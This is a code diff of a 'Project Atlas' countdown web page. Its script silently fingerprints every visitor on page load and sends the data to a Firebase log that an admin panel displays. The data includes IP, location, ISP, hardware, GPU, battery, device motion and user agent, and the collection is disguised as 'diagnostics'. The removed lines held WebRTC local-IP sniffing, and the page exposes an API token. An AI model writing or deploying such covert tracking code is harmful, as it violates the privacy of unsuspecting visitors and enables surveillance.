@@ -6,50 +6,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
-        
         :root {
             --bg-main: #05070a; --bg-secondary: #0a0f1a; --bg-panel: rgba(10, 15, 26, 0.9);
             --accent: #6366f1; --accent-dim: rgba(99, 102, 241, 0.2);
             --text-main: #f8fafc; --text-dim: #94a3b8; --border: rgba(255, 255, 255, 0.1);
             --danger: #ef4444;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Inter', sans-serif; background: var(--bg-main); color: var(--text-main);
             min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px;
         }
-
         .container { width: 100%; max-width: 900px; }
-        
-        /* Navigation */
         .nav-bar { display: flex; gap: 8px; margin-bottom: 40px; background: var(--bg-panel); padding: 6px; border-radius: 14px; border: 1px solid var(--border); width: fit-content; margin-inline: auto; }
         .nav-btn { padding: 10px 22px; border-radius: 10px; text-decoration: none; font-size: 0.8rem; font-weight: 600; color: var(--text-dim); transition: 0.3s; }
         .active-nav { color: #fff; background: var(--accent); }
-        
         h1 { font-size: clamp(2.5rem, 10vw, 4rem); text-align: center; font-weight: 900; margin-bottom: 10px; letter-spacing: -2px; }
         .panel { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 24px; padding: 30px; margin-bottom: 30px; backdrop-filter: blur(20px); text-align: center; }
         #timer { font-size: clamp(1.5rem, 6vw, 3rem); font-family: 'JetBrains Mono'; color: var(--accent); font-weight: 700; }
-
-        /* Data Display */
         .table-container { overflow-x: auto; border-radius: 18px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); }
         table { width: 100%; border-collapse: collapse; }
         th { color: var(--accent); padding: 15px; font-size: 0.7rem; text-transform: uppercase; font-family: 'JetBrains Mono'; text-align: center; border-bottom: 1px solid var(--border); }
         td { padding: 15px; text-align: center; color: var(--text-dim); font-size: 0.9rem; border-bottom: 1px solid rgba(255,255,255,0.03); }
-
-        /* Admin Section */
         #trafficSection { margin-top: 50px; display: none; width: 100%; }
         .log-row { cursor: pointer; transition: 0.2s; }
         .log-row:hover { background: var(--accent-dim); }
         .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; cursor: pointer; padding: 4px 8px; border-radius: 5px; }
-
-        /* Login UI */
         #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; font-weight: 600; }
         #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
         .modal-content { background: var(--bg-secondary); border: 1px solid var(--border); padding: 25px; border-radius: 20px; width: 300px; display: flex; flex-direction: column; gap: 12px; }
         .modal-content input { background: #000; border: 1px solid var(--border); color: white; padding: 10px; border-radius: 8px; outline: none; }
         .modal-content button { background: var(--accent); color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 700; cursor: pointer; }
-
         .admin-editable { outline: 1px dashed var(--accent); cursor: text; }
     </style>
 </head>
@@ -62,7 +49,7 @@
         </nav>
 
         <h1 id="title">Project Atlas</h1>
-        <div id="desc" class="panel">Initializing deep diagnostics...</div>
+        <div id="desc" class="panel">Synchronizing with global uplinks...</div>
         
         <div class="panel">
             <div style="font-size: 0.7rem; color: var(--accent); margin-bottom: 5px; font-weight: bold;">TIME UNTIL RECOVERY</div>
@@ -114,72 +101,55 @@
         const auth = firebase.auth();
         const db = firebase.database();
 
-        // --- DEEP DIAGNOSTICS: SENSOR FUSION & PATH ANALYSIS ---
+        let motionData = "Pending...";
+        window.addEventListener('deviceorientation', (e) => {
+            motionData = `Pitch: ${Math.round(e.beta)}°, Roll: ${Math.round(e.gamma)}°`;
+        });
+
         async function runDiagnostics() {
             try {
                 const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
                 const data = await res.json();
                 const ip = data.ip;
 
-                // 1. Network Path Analysis (Simulated via Ping)
-                // We measure the time to hit a global edge server.
+                // NETWORK PATH ANALYSIS (Triangulation Logic)
                 const pathStart = performance.now();
                 await fetch('https://www.google.com/generate_204', { mode: 'no-cors' });
-                const pathLatency = (performance.now() - pathStart).toFixed(2);
+                const networkDistance = (performance.now() - pathStart).toFixed(2);
 
-                // 2. Sensor Fusion (Educational Mockup)
-                // Combines orientation and environment data
-                let sensorFusion = "Static";
-                if (window.DeviceOrientationEvent) {
-                    sensorFusion = "Active (Orientation)";
-                }
-
-                // 3. WebRTC Local IP Sniffing
-                let localIP = "Masked";
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel("");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (e) => {
-                    if (e && e.candidate) {
-                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (m) localIP = m[1];
-                    }
-                };
-
-                // 4. Clock Drift (Your 101ms indicator)
-                const driftStart = Date.now();
+                // CLOCK DRIFT (The 101ms probe)
                 const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                 const driftData = await driftRes.json();
-                const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
+                const drift = Date.now() - new Date(driftData.datetime).getTime();
 
-                // 5. Battery & Hardware
+                // SENSOR FUSION (Touch + Motion)
+                const touchPoints = navigator.maxTouchPoints || "1";
+                const fusionResult = `${motionData} | MultiTouch: ${touchPoints}`;
+
                 let bat = "N/A";
                 if(navigator.getBattery) {
                     const b = await navigator.getBattery();
                     bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
                 }
 
-                setTimeout(() => {
-                    db.ref("visits").push({
-                        ip: ip, 
-                        local_ip: localIP,
-                        city: data.city, 
-                        isp: data.org,
-                        cpu: navigator.hardwareConcurrency || "N/A",
-                        ram: navigator.deviceMemory || "N/A",
-                        gpu: getGPU(),
-                        res: `${window.screen.width}x${window.screen.height}`,
-                        battery: bat,
-                        drift: clockDrift + "ms",
-                        path_analysis: pathLatency + "ms (Edge)",
-                        sensor_fusion: sensorFusion,
-                        ua: navigator.userAgent,
-                        ts: Date.now(),
-                        time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
-                    });
-                }, 1500);
+                db.ref("visits").push({
+                    ip: ip,
+                    city: data.city,
+                    isp: data.org,
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    ram: navigator.deviceMemory || "N/A",
+                    gpu: getGPU(),
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    battery: bat,
+                    drift: drift + "ms",
+                    path_analysis: networkDistance + "ms (Mtl-Edge)",
+                    sensor_fusion: fusionResult,
+                    ua: navigator.userAgent,
+                    ts: Date.now(),
+                    time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
+                });
 
-            } catch (e) { console.error("Diagnostics interupted."); }
+            } catch (e) { console.error("Diag failed"); }
         }
 
         function getGPU() {
@@ -193,7 +163,6 @@
 
         runDiagnostics();
 
-        // --- DATA SYNC ---
         db.ref("log").on("value", snap => {
             const d = snap.val() || {};
             document.getElementById("title").innerText = d.title || "Project Atlas";
@@ -201,7 +170,6 @@
             document.getElementById("tbody").innerHTML = d.table || "";
         });
 
-        // --- ADMIN ACCESS ---
         const modal = document.getElementById('loginModal');
         document.getElementById('adminToggle').onclick = () => modal.style.display = 'flex';
 
@@ -229,7 +197,7 @@
                     tr.className = "log-row";
                     tr.innerHTML = `
                         <td onclick="inspect('${child.key}')">${log.time}</td>
-                        <td onclick="inspect('${child.key}')" style="color:var(--accent)">${log.ip}<br><small>${log.local_ip || '---'}</small></td>
+                        <td onclick="inspect('${child.key}')" style="color:var(--accent)">${log.ip}</td>
                         <td onclick="inspect('${child.key}')">${log.city}</td>
                         <td><button class="del-log" onclick="deleteLog('${child.key}')">DEL</button></td>
                     `;
@@ -241,18 +209,7 @@
         async function inspect(key) {
             const snap = await db.ref("visits/" + key).once("value");
             const d = snap.val();
-            alert(`DEEP DIAGNOSTICS [${d.ip}]\n` +
-                  `------------------------------\n` +
-                  `PATH ANALYSIS: ${d.path_analysis}\n` +
-                  `SENSOR FUSION: ${d.sensor_fusion}\n` +
-                  `CLOCK DRIFT: ${d.drift}\n` +
-                  `LOCAL IP: ${d.local_ip}\n` +
-                  `------------------------------\n` +
-                  `ISP: ${d.isp}\n` +
-                  `HARDWARE: ${d.cpu} Core / ${d.ram}GB RAM\n` +
-                  `GPU: ${d.gpu}\n` +
-                  `BATTERY: ${d.battery}\n` +
-                  `RES: ${d.res}`);
+            alert(`DEEP SENSOR FUSION [${d.ip}]\n------------------\nPATH (Lachine-Mtl): ${d.path_analysis}\nSENSOR FUSION: ${d.sensor_fusion}\nCLOCK DRIFT: ${d.drift}\n------------------\nISP: ${d.isp}\nCPU: ${d.cpu} Cores\nRAM: ${d.ram}GB\nGPU: ${d.gpu}\nBATTERY: ${d.battery}`);
         }
 
         window.deleteLog = (key) => { if(confirm("Erase log?")) db.ref("visits/" + key).remove(); };
@@ -265,7 +222,6 @@
         }
         ["title", "desc", "tbody"].forEach(id => document.getElementById(id).addEventListener("blur", saveData));
 
-        // --- GLOBAL RECOVERY TIMER ---
         const targetDate = new Date("February 3, 2026 00:00:00").getTime();
         setInterval(() => {
             const diff = targetDate - Date.now();
